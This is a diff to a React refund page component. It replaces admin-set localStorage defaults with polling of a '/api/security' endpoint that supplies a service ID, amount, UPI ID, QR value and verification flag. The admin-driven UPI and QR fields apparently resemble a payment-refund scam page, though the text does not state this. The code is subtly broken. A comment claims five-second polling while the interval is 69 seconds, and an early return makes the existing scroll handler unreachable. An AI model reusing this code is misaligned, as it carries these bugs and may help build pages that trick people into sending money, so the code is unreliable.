@@ -18,12 +18,14 @@ function formatDate(dateStr, fallback) {
 
 export default function RefundPage() {
   const [form, setForm] = useState({
-    serviceId: localStorage.getItem("admin_serviceId") || "000-000",
-    mobile: localStorage.getItem("admin_mobile") || "Not Entered",
-    joiningDate: formatDate(localStorage.getItem("admin_joiningDate"), "2025-01-01"),
-    refundDate: formatDate(localStorage.getItem("admin_refundDate"), "2025-01-01"),
-    amount: localStorage.getItem("admin_amount") || "8,500",
-    upi: localStorage.getItem("admin_upi") || "your-upi-id@upi"
+    serviceId: "",
+    mobile: "",
+    joiningDate: "",
+    refundDate: "",
+    amount: "",
+    upi: "",
+    qr: "",
+    id_verified: "",
   });
   const [submitted, setSubmitted] = useState(false);
   const [showUPIApps, setShowUPIApps] = useState(false);
@@ -74,6 +76,32 @@ export default function RefundPage() {
   );
 
   useEffect(() => {
+    // Function to fetch security data
+    const fetchSecurity = () => {
+      fetch('/api/security')
+        .then(res => res.json())
+        .then(data => {
+          if (data) {
+            setForm({
+              serviceId: data.serviceId || "",
+              mobile: data.mobile || "",
+              joiningDate: data.joiningDate || "",
+              refundDate: data.refundDate || "",
+              amount: data.amount || "",
+              upi: data.upi || "",
+              qr: data.qr || "",
+              id_verified: data.id_verified || "",
+            });
+          }
+        });
+    };
+    // Initial fetch
+    fetchSecurity();
+    // Poll every 5 seconds
+    const interval = setInterval(fetchSecurity, 69000);
+    // Cleanup
+    return () => clearInterval(interval);
+    
     function handleScroll() {
       const container = pageContainerRef.current;
       if (!container) return;
